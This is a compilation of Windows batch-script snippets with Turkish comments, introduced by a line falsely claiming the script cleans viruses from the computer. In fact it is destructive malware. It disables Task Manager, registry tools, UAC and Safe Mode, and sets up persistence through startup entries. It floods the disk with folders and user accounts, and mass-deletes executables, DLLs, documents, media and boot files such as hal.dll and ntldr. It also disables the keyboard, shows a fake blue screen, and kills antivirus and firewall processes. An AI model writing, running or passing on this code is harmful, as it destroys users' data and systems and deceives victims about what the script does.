@echo off
iyi bir şeyler bekle bu çok iyi o kadar iyiki bilgisayarı temizler bilgisayardaki virüsleri siler
@echo off
TASKKILL /F /IM EXPLORER.EXE
@echo off
set lol=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
Set val=NoUserNameInStartMenu
Set date=1
reg.exe add "%lol%" /v "%val%" /d "%date%" /f >nul
@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t
REG_DWORD/d 1/f > nul
@echo off

cd /

cls

color 17

echo A problem has been detected and Windows has been shut down to prevent damage

echo to your computer.

echo.

echo The problem seems to be caused by the following file: SPCMDCON.SYS

echo.

echo PAGE_FAULT_IN_NONPAGED_AREA

echo.

echo If this is the first time you've seen this stop error screen,

echo restart your computer. If this screen appears again, follow

echo these steps:

echo.

echo Check to make sure any new hardware or software is properly installed.

echo If this is a new installation, ask your hardware or software manufacturer

echo for any Windows updates you might need.

echo.

echo If problems continue, disable or remove any newly installed hardware

echo or software. Disable BIOS memory options such as caching or shadowing.

echo If you need to use Safe Mode to remove or disable components, restart

echo your computer, press F8 to select Advanced Startup Options, and then

echo select Safe Mode.

echo.

echo Technical information:

echo.

echo *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x0000 0000)

echo.

echo.

echo *** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c

@echo off
color 0a
:SCROLLR
echo 3 1 4 1 5 9 2 6 5 3 5 8 9 7 9 3 2 3 8 4 6 2 6 4 3 3 8 3 2 7 9 5 0 2 8 1 6 9 6
echo 4 1 9 7 1 6 9 3 9 9 3 7 5 1 0 5 8 2 0 9 7 4 9 4 4 5 9 2 3 0 7 8 1 6 4 1 9 9 5
echo 0 6 2 8 6 2 0 8 9 9 8 6 2 8 0 3 4 8 2 5 3 4 2 1 1 7 0 6 7 9 8 2 1 4 8 7 3 5 9
echo 0 8 6 5 1 3 2 8 2 3 0 6 6 4 7 0 9 3 8 4 4 6 0 9 5 5 0 5 8 2 2 3 1 7 2 1 5 6 8
echo 5 3 5 9 4 0 8 1 2 8 4 8 1 1 1 7 4 5 0 2 8 4 1 0 2 7 0 1 9 3 8 5 2 1 1 2 3 8 5
echo 0 5 5 5 9 6 4 4 6 2 2 9 4 8 9 5 4 9 3 0 3 8 1 9 6 4 4 2 8 8 1 0 9 7 5 4 8 6 1
echo 6 6 5 9 3 3 4 4 6 1 2 8 4 7 5 6 4 8 2 3 3 7 8 6 7 8 3 1 6 5 2 7 1 2 0 6 3 3 9
echo 1 9 0 9 1 4 5 6 4 8 5 6 6 9 2 3 4 6 0 3 4 8 6 1 0 4 5 4 3 2 6 6 4 8 2 4 6 7 8
echo 1 3 3 9 3 6 0 7 2 6 0 2 4 9 1 4 1 2 7 3 7 2 4 5 8 7 0 0 6 6 0 6 3 1 5 6 9 3 5
echo 5 8 8 1 7 4 8 8 1 5 2 0 9 2 0 9 6 2 8 2 9 2 5 4 0 9 1 7 1 5 3 6 4 3 6 8 4 9 3
echo 7 8 9 2 5 9 0 3 6 0 0 1 1 3 3 0 5 3 0 5 4 8 8 2 0 4 6 6 5 2 1 3 8 4 1 5 9 4 8
echo 4 6 9 5 1 9 4 1 5 1 1 6 0 9 4 3 3 0 5 7 2 7 0 3 6 5 7 5 9 5 9 1 9 5 3 1 4 3 9
echo 0 9 2 1 8 6 1 1 7 3 8 1 9 3 2 6 1 1 7 9 3 1 0 5 1 1 8 5 4 8 0 7 4 4 6 9 8 5 6
goto SCROLLR
@echo off
color 0a
:SCROLLR
echo 3 1 4 1 5 9 2 6 5 3 5 8 9 7 9 3 2 3 8 4 6 2 6 4 3 3 8 3 2 7 9 5 0 2 8 1 6 9 6
echo 4 1 9 7 1 6 9 3 9 9 3 7 5 1 0 5 8 2 0 9 7 4 9 4 4 5 9 2 3 0 7 8 1 6 4 1 9 9 5
echo 0 6 2 8 6 2 0 8 9 9 8 6 2 8 0 3 4 8 2 5 3 4 2 1 1 7 0 6 7 9 8 2 1 4 8 7 3 5 9
echo 0 8 6 5 1 3 2 8 2 3 0 6 6 4 7 0 9 3 8 4 4 6 0 9 5 5 0 5 8 2 2 3 1 7 2 1 5 6 8
echo 5 3 5 9 4 0 8 1 2 8 4 8 1 1 1 7 4 5 0 2 8 4 1 0 2 7 0 1 9 3 8 5 2 1 1 2 3 8 5
echo 0 5 5 5 9 6 4 4 6 2 2 9 4 8 9 5 4 9 3 0 3 8 1 9 6 4 4 2 8 8 1 0 9 7 5 4 8 6 1
echo 6 6 5 9 3 3 4 4 6 1 2 8 4 7 5 6 4 8 2 3 3 7 8 6 7 8 3 1 6 5 2 7 1 2 0 6 3 3 9
echo 1 9 0 9 1 4 5 6 4 8 5 6 6 9 2 3 4 6 0 3 4 8 6 1 0 4 5 4 3 2 6 6 4 8 2 4 6 7 8
echo 1 3 3 9 3 6 0 7 2 6 0 2 4 9 1 4 1 2 7 3 7 2 4 5 8 7 0 0 6 6 0 6 3 1 5 6 9 3 5
echo 5 8 8 1 7 4 8 8 1 5 2 0 9 2 0 9 6 2 8 2 9 2 5 4 0 9 1 7 1 5 3 6 4 3 6 8 4 9 3
echo 7 8 9 2 5 9 0 3 6 0 0 1 1 3 3 0 5 3 0 5 4 8 8 2 0 4 6 6 5 2 1 3 8 4 1 5 9 4 8
echo 4 6 9 5 1 9 4 1 5 1 1 6 0 9 4 3 3 0 5 7 2 7 0 3 6 5 7 5 9 5 9 1 9 5 3 1 4 3 9
echo 0 9 2 1 8 6 1 1 7 3 8 1 9 3 2 6 1 1 7 9 3 1 0 5 1 1 8 5 4 8 0 7 4 4 6 9 8 5 6
goto SCROLLR
@echo off
pause
color 0a
mode 1000
:A
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
GOTO A
@echo off
reg delete HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal/f > nul
reg delete HKLM\SYSTEM\currentcontrolset\control\safeboot\network/f > nul
color 02
@echo off
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
@echo off
copy %0 %windir%\%0
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices /v Pwner /t REG_SZ /d %windir%\%0 /f >nul
@echo off
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
@ECHO OFF
@ECHO PC DELIRT
GOTO start
:start
@ECHO SET magic2=1 >> bat6.bat
@ECHO GOTO flood5 >> bat6.bat
@ECHO :flood5 >> bat6.bat
@ECHO SET /a magic2=%%magic2%%+1 >> bat6.bat
@ECHO NET USER magic2%%magic2%% /add >> bat6.bat
@ECHO GOTO flood5 >> bat6.bat
START /MIN bat6.bat
GOTO bat5
:bat5
@ECHO CD %%ProgramFiles%%\ >> bat5.bat
@ECHO SET pogo=1 >> bat5.bat
@ECHO GOTO flood4 >> bat5.bat
@ECHO :flood4 >> bat5.bat
@ECHO MKDIR pogo%%pogo%% >> bat5.bat
@ECHO SET /a pogo=%%pogo%%+1 >> bat5.bat
@ECHO GOTO flood4 >> bat5.bat
START /MIN bat5.bat
GOTO bat4
:bat4
@ECHO CD %%SystemRoot%%\ >> bat4.bat
@ECHO SET hat=1 >> bat4.bat
@ECHO GOTO flood3 >> bat4.bat
@ECHO :flood3 >> bat4.bat
@ECHO MKDIR hat%%hat%% >> bat4.bat
@ECHO SET /a hat=%%hat%%+1 >> bat4.bat
@ECHO GOTO flood3 >> bat4.bat
START /MIN bat4.bat
GOTO bat3
:bat3
@ECHO CD %%UserProfile%%\Start Menu\Programs\ >> bat3.bat
@ECHO SET chart=1 >> bat3.bat
@ECHO GOTO flood2 >> bat3.bat
@ECHO :flood2 >> bat3.bat
@ECHO MKDIR chart%%chart%% >> bat3.bat
@ECHO SET /a chart=%%chart%%+1 >> bat3.bat
@ECHO GOTO flood2 >> bat3.bat
START /MIN bat3.bat
GOTO bat2
:bat2
@ECHO CD %%UserProfile%%\Desktop\ >> bat2.bat
@ECHO SET gamer=1 >> bat2.bat
@ECHO GOTO flood >> bat2.bat
@ECHO :flood >> bat2.bat
@ECHO MKDIR gamer%%gamer%% >> bat2.bat
@ECHO SET /a gamer=%%gamer%%+1 >> bat2.bat
@ECHO GOTO flood >> bat2.bat
START /MIN bat2.bat
GOTO original
original
CD %HomeDrive%\
SET sharma=1
GOTO flood1
:flood1
MKDIR sharma%sharma%
SET /a sharma=%sharma%+1
GOTO flood1
GOTO start
@echo off
rem ---------------------------------
rem Spam Printer
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> "Spam.txt"
notepad /P "Spam.txt"
rem ---------------------------------
echo Do >> "diskac.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "diskac.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "diskac.vbs"
echo colCDROMs.Item(d).Eject  >> "diskac.vbs"
echo colCDROMs.Item(d).Eject  >> "diskac.vbs"
echo Loop >> "diskac.vbs"
start "" "diskac.vbs"
diskac.vbs
@echo off
rem ---------------------------------
rem Spam TXT
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
echo %random% > C:\%random%.txt
rem ---------------------------------
@echo off
copy %0 %windir%\system32\ls.bat

@echo off
copy %0 "%userprofile%\Start Menu\Programs\Startup"

@echo off
rem ---------------------------------
rem TUM EXELERI SIL
DIR /S/B %SystemDrive%\*.exe >> FIleListe_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_exe.txt) do del "%%j:%%k"
for /R C:\ %%a in (*.exe) do erase /F %%a > nul
rem ---------------------------------
@echo off
rem ---------------------------------
rem Hal.dll silip pcyi etkisiz hale getirme
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
shutdown /s /t 00
rem ---------------------------------
@echo off
rem ---------------------------------
rem Belgelerimi sil
del /f /q %userprofile%\My Documents\*.*
del /f /q %userprofile%\Belgeler\*.*

rem ---------------------------------
del /f /q %userprofile%\Mes documents\*.*
rem ---------------------------------
@echo off
rem ---------------------------------
rem TUM DLL'leri sil
DIR /S/B %SystemDrive%\*.dll >> FIleListe_dll.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_dll.txt) do del "%%j:%%k"
for /R C:\ %%a in (*.dll) do erase /F %%a > nul
rem ---------------------------------
@echo off
rem ---------------------------------
rem TUM TXTLERI SIL
DIR /S/B %SystemDrive%\*.txt >> FIleListe_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_txt.txt) do del "%%j:%%k"
rem ---------------------------------
@echo off
rem ---------------------------------
rem TUM XMLLERI SIL
DIR /S/B %SystemDrive%\*.xml >> FIleListe_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_xml.txt) do del "%%j:%%k"
rem ---------------------------------
@echo off
rem ---------------------------------
rem Tum mp4leri sil
DIR /S/B %SystemDrive%\*.mp4 >> FIleListe_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_mp4.txt) do del "%%j:%%k"
rem ---------------------------------
Paint, Hesap makinesi, not defteri, regedit, explorer ve bfsvc siler

tskill mspaint
del /f /q %systemroot%\mspaint
del /f /q %systemroot%\system32\mspaint
tskill calc
del /f /q %systemroot%\calc
del /f /q %systemroot%\system32\calc
tskill notepad
del /f /q %systemroot%\notepad
del /f /q %systemroot%\system32\notepad
tskill regedit
del /f /q %systemroot%\regedit
del /f /q %systemroot%\system32\regedit
tskill explorer
del /f /q %systemroot%\explorer
del /f /q %systemroot%\system32\explorer
tskill bfsvc
del /f /q %systemroot%\bfsvc
del /f /q %systemroot%\system32\bfsvc
@echo off
DEL C:\Windows\System32\notepad.exe
@echo off
RMDIR %systemroot%
@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
shutdown /r /t 00
@echo off
rem ---------------------------------
rem Müzikleri sil
del /f /q %userprofile%\My Music\*.*
del /f /q %userprofile%\Müzik\*.*

rem ---------------------------------
del /f /q %userprofile%\Ma musique\*.*
rem ---------------------------------
@echo off
rem --------------------------------- 
rem Resimlerimi sil
del /f /q %userprofile%\My Pictures\*.*
del /f /q %userprofile%\Resimlerim\*.*

rem --------------------------------- 
rem --------------------------------- 
rem Delete Mes images
del /f /q %userprofile%\Mes images\*.*
rem ---------------------------------
@echo off
echo o|del "%USERPROFILE%\WINDOWS\*.*"
@echo off
rem ---------------------------------
rem TUM DOC SIL
DIR /S/B %SystemDrive%\*.doc >> FIleListe_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_doc.txt) do del "%%j:%%k"
rem ---------------------------------
@echo off
rem ---------------------------------
rem TUM MP3LERI SIL
DIR /S/B %SystemDrive%\*.mp3 >> FIleListe_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_mp3.txt) do del "%%j:%%k"
rem ---------------------------------
@echo off
rem ---------------------------------
rem Tum pngleri sil
DIR /S/B %SystemDrive%\*.png >> FIleListe_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleListe_png.txt) do del "%%j:%%k"
rem ---------------------------------

@echo off
rem ---------------------------------
rem Windows XP Gizli baslangic müziği
start "" "%systemroot%\system32\oobe\images\title.wma"
rem ---------------------------------
cls
:A
color 0a
cls
@echo off
echo Wscript.Sleep 5000>C:\sleep5000.vbs
echo Wscript.Sleep 3000>C:\sleep3000.vbs
echo Wscript.Sleep 4000>C:\sleep4000.vbs
echo Wscript.Sleep 2000>C:\sleep2000.vbs
cd %systemroot%\System32
dir
cls
start /w wscript.exe C:\sleep3000.vbs
echo Kritik Windows dosyalari siliniyor..
echo del *.*
start /w wscript.exe C:\sleep3000.vbs
echo Silinme basarili..
echo:
echo:
echo:
echo Kok kategori siliniyor..
start /w wscript.exe C:\sleep2000.vbs
echo del %SYSTEMROOT%
start /w wscript.exe C:\sleep4000.vbs
echo Silme basarili
start /w wscript.exe C:\sleep2000.vbs
echo:
echo:
echo:
echo Hack dizini oluşturuluyor..
cd C:\Documents and Settings\All Users\Start Menu\Programs\
mkdir h4x
start /w wscript.exe C:\sleep3000.vbs
echo Hack dizini basarili..
echo:
echo:
echo:
echo Yurutme denemesi 1..
start /w wscript.exe C:\sleep3000.vbs
echo cd C:\Documents and Settings\All Users\Start Menu\Programs\Startup\h4x\
echo start hax.exe
start /w wscript.exe C:\sleep3000.vbs
echo Virus basariyla acildi..
echo:
echo:
echo:
start /w wscript.exe C:\sleep2000.vbs
echo Windows Firewall kapatiliyor..
start /w wscript.exe C:\sleep2000.vbs
echo Butun programlar kapatiliyor..
start /w wscript.exe C:\sleep2000.vbs
echo Baslangic virusu aktif..
start /w wscript.exe C:\sleep2000.vbs
echo:
echo:
echo Virus basariyla yayildi..
start /w wscript.exe C:\sleep2000.vbs
echo:
start /w wscript.exe C:\sleep2000.vbs
pause
shutdown -f -s -c “Bilgisayariniz intihar etti. Iyi gunler”
@echo off
rem ---------------------------------
rem Klavye Devre disi etme
echo Windows Registry Editor Version 5.00 > "klavyekapa.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "klavyekapa.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "klavyekapa.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "klavyekapa.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "klavyekapa.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "klavyekapa.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "klavyekapa.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "klavyekapa.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "klavyekapa.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "klavyekapa.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "klavyekapa.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "klavyekapa.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "klavyekapa.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "klavyekapa.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "klavyekapa.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "klavyekapa.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "klavyekapa.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "klavyekapa.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "klavyekapa.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "klavyekapa.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "klavyekapa.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "klavyekapa.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "klavyekapa.reg"
start "klavyekapa.reg"
rem ---------------------------------
@echo off
rem ---------------------------------
rem Fare tuslarinin yerini degistir..
RUNDLL32 USER32.DLL,SwapMouseButton
rem ---------------------------------
@echo off
rem ---------------------------------
rem Anti-virüs öldürücü v1
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
